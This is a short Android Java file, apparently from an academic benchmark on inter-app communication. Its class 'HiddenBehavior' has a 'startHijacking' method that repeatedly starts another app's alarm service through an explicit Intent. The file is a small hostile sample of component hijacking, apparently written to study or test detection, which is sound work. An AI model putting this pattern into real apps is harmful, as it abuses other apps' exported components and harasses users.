package edu.uci.seal.icc;

import android.content.Context;
import android.content.Intent;

public class HiddenBehavior {
    public void startHijacking(Context context){
    	Intent alarmIntent = new Intent();
    	alarmIntent.setAction("trikita.talalarmo.action.START_ALARM");
        alarmIntent.setPackage("trikita.talalarmo");
        for(int i=0; i< 100; i++) {
            context.startService(alarmIntent);
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

}
